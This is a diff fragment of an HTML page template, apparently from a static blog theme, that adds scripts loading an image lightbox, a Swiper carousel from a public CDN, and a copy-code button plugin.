+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
